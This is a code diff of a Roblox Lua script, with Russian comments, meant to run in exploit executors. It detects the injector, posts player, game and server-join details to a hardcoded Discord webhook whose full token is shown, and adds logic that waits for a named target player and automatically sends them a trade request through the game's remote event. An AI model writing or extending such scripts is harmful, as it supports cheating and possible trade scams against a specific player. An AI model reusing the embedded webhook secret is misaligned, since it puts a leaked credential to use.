@@ -1,6 +1,9 @@
 -- ⚠️ Не публикуй этот URL. Замени на свой.
 local webhookUrl = "https://discord.com/api/webhooks/1566534128218804466/KMXt1caKqnxCvjDQLmS9R9QTzO5AaJxwqRpRsGLYdDZ2Gg75jx5IXsUwRZ9ROUdR9egJ"
 
+-- 🔧 Ник игрока, которому нужно отправить трейд, когда он зайдёт
+local TARGET_NAME = "Marie_31113"
+
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
@@ -21,12 +24,6 @@ if not jobId or jobId == "" then
     return
 end
 
--- 2.1. Отправляем запрос на сервер (твой фрагмент)
-local Event = ReplicatedStorage.Trade.SendRequest
-pcall(function()
-    Event:InvokeServer(Players.Marie_31113)
-end)
-
 -- 3. Название игры (с защитой от ошибок, если игра недоступна)
 local gameName = "Неизвестная игра"
 pcall(function()
@@ -34,7 +31,6 @@ pcall(function()
 end)
 
 -- 4. Определение исполнителя (инжектора)
---    Проверяем известные глобальные переменные эксплойтов.
 local function detectExecutor()
     local checks = {
         { name = "Synapse X",        test = function() return syn and syn.request end },
@@ -64,7 +60,6 @@ local function detectExecutor()
         end
     end
 
-    -- Fallback: пытаемся вытащить имя из identity/executor
     local ok, name = pcall(function()
         return (identifyexecutor and identifyexecutor()) or "Неизвестный исполнитель"
     end)
@@ -83,71 +78,123 @@ local joinLink = string.format(
     placeId, jobId
 )
 
--- 6. Формируем embed-сообщение
-local payload = {
-    username = "Roblox Logger",
-    embeds = {
-        {
-            title = "🎮 Игрок в игре",
-            description = string.format("**%s** присоединился к игре", LocalPlayer.Name),
-            color = 0x5865F2, -- Discord blurple
-            fields = {
-                {
-                    name = "🕹️ Игра",
-                    value = string.format("**%s**\n`PlaceId: %d`", gameName, placeId),
-                    inline = false
-                },
-                {
-                    name = "⚙️ Исполнитель",
-                    value = string.format("**%s**", executorName),
-                    inline = true
-                },
-                {
-                    name = "🔗 Сервер",
-                    value = string.format("[Присоединиться](%s)", joinLink),
-                    inline = true
-                },
-                {
-                    name = "👤 Игрок",
-                    value = string.format("**%s** (`%d`)", LocalPlayer.Name, LocalPlayer.UserId),
-                    inline = false
-                }
-            },
-            footer = { text = "Roblox Webhook Logger" },
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        }
-    },
-    -- Разрешаем только упоминания пользователей, чтобы не пинговали @everyone
-    allowed_mentions = { parse = { "users" } }
-}
-
--- 7. Ищем доступную функцию HTTP-запроса (эксплойт-окружение)
+-- 6. Функция отправки вебхука (вызывается один раз при срабатывании)
 local requestFunc = http_request or request or (syn and syn.request) or (http and http.request)
 
-if not requestFunc then
-    warn("[webhook] Не найдена функция HTTP-запроса (http_request/request/syn.request). Скрипт работает только в эксплойте.")
-    return
+local function sendWebhook(targetPlayer)
+    if not requestFunc then
+        warn("[webhook] Не найдена функция HTTP-запроса (http_request/request/syn.request).")
+        return
+    end
+
+    local payload = {
+        username = "Roblox Logger",
+        embeds = {
+            {
+                title = "🎯 Цель зашла на сервер — трейд отправлен",
+                description = string.format("**%s** зашёл в игру, запрос на трейд отправлен.", targetPlayer.Name),
+                color = 0x00C853, -- зелёный
+                fields = {
+                    {
+                        name = "🕹️ Игра",
+                        value = string.format("**%s**\n`PlaceId: %d`", gameName, placeId),
+                        inline = false
+                    },
+                    {
+                        name = "⚙️ Исполнитель",
+                        value = string.format("**%s**", executorName),
+                        inline = true
+                    },
+                    {
+                        name = "🔗 Сервер",
+                        value = string.format("[Присоединиться](%s)", joinLink),
+                        inline = true
+                    },
+                    {
+                        name = "👤 Я (инициатор)",
+                        value = string.format("**%s** (`%d`)", LocalPlayer.Name, LocalPlayer.UserId),
+                        inline = false
+                    },
+                    {
+                        name = "🎯 Цель",
+                        value = string.format("**%s** (`%d`)", targetPlayer.Name, targetPlayer.UserId),
+                        inline = false
+                    }
+                },
+                footer = { text = "Roblox Webhook Logger" },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }
+        },
+        allowed_mentions = { parse = { "users" } }
+    }
+
+    local ok, response = pcall(function()
+        return requestFunc({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+
+    if not ok then
+        warn("[webhook] Ошибка запроса: " .. tostring(response))
+        return
+    end
+
+    local status = response and (response.StatusCode or response.status)
+    if status and status >= 200 and status < 300 then
+        print("[webhook] Сообщение отправлено.")
+    else
+        warn("[webhook] Discord вернул статус: " .. tostring(status))
+    end
 end
 
--- 8. Отправляем с обработкой ошибок
-local ok, response = pcall(function()
-    return requestFunc({
-        Url = webhookUrl,
-        Method = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
-        Body = HttpService:JSONEncode(payload)
-    })
-end)
-
-if not ok then
-    warn("[webhook] Ошибка запроса: " .. tostring(response))
-    return
+-- 7. Функция отправки трейда конкретному игроку
+local function sendTrade(targetPlayer)
+    local ok, err = pcall(function()
+        local Event = ReplicatedStorage:WaitForChild("Trade", 10):WaitForChild("SendRequest", 10)
+        Event:InvokeServer(targetPlayer)
+    end)
+    if not ok then
+        warn("[trade] Не удалось отправить запрос на трейд: " .. tostring(err))
+        return false
+    end
+    print("[trade] Запрос на трейд отправлен игроку " .. targetPlayer.Name)
+    return true
 end
 
--- 9. Проверяем статус ответа Discord (успех — 204 No Content)
-local status = response and (response.StatusCode or response.status)
-if status and status >= 200 and status < 300 then
-    print("[webhook] Сообщение отправлено.")
-else
-    warn("[webhook] Discord вернул статус: " .. tostring(status))
+-- 8. Обработчик появления игрока
+local tradeSent = false  -- защита, чтобы не отправить трейд дважды
+
+local function onPlayerAdded(player)
+    if tradeSent then return end
+    if player.Name ~= TARGET_NAME then return end
+    if player == LocalPlayer then return end  -- на всякий случай, если ник совпал с нашим
+
+    tradeSent = true
+    print("[main] Цель " .. player.Name .. " зашла на сервер!")
+
+    -- Небольшая задержка, чтобы персонаж успел загрузиться
+    task.wait(1.5)
+
+    if sendTrade(player) then
+        sendWebhook(player)
+    end
 end
+
+-- 9. Если цель уже на сервере — сработаем сразу
+local existing = Players:FindFirstChild(TARGET_NAME)
+if existing and existing ~= LocalPlayer then
+    task.spawn(function()
+        tradeSent = true
+        print("[main] Цель " .. existing.Name .. " уже на сервере.")
+        task.wait(1.5)
+        if sendTrade(existing) then
+            sendWebhook(existing)
+        end
+    end)
+end
+
+-- 10. Подписываемся на будущие подключения
+Players.PlayerAdded:Connect(onPlayerAdded)
